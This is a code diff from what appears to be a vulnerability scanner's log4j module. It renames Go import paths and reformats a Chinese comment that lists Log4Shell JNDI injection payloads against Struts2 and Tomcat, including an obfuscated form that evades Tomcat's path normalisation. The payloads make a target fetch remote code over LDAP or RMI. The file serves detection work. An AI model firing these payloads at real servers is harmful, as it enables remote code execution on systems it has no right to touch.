@@ -3,8 +3,8 @@ package log4j
 import (
 	"fmt"
 	"github.com/hktalent/PipelineHttp"
-	"github.com/hktalent/ProScan4all/lib/util"
-	"github.com/hktalent/ProScan4all/pkg/jndi"
+	"github.com/hktalent/scan4all/lib/util"
+	"github.com/hktalent/scan4all/pkg/jndi"
 	"log"
 	"net/http"
 	"net/url"
@@ -34,7 +34,9 @@ func CheckX3(u string) bool {
 	return false
 }
 
-/* struts2 https://www.moonsec.com/5663.html
+/*
+	struts2 https://www.moonsec.com/5663.html
+
 方法4：checkbox 拦截器,超过1个checkebox触发: .action?__checkbox_${jndi:ldap://127.0.0.1:1099/exp}=a&__checkbox_${jndi:ldap://127.0.0.1:1099/exp}=b
 方法1：静态文件If-Modified-Since头
 方法2：检查请求参数长度
@@ -49,12 +51,10 @@ http://localhost:8080/helloworld_war/$%7Bjndi:ldap:$%7B::-/%7D/127.0.0.1:8888/Ca
 但是还有一个问题就是tomcat会将//识别为/，这里就需要将payload进行转变，最后可以使用
 $%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/
 
-
 方法5：struts.token.name
 
 此payload收集于网络，原创作者不知道是谁，检测payload如下：
 http://127.0.0.1:8080/struts2-showcase/token/transfer4.action -d struts.token.name=’${jndi:rmi://127.0 .0.1:1099/ylbtsl}’
-
 */
 func CheckStruts2() {
 
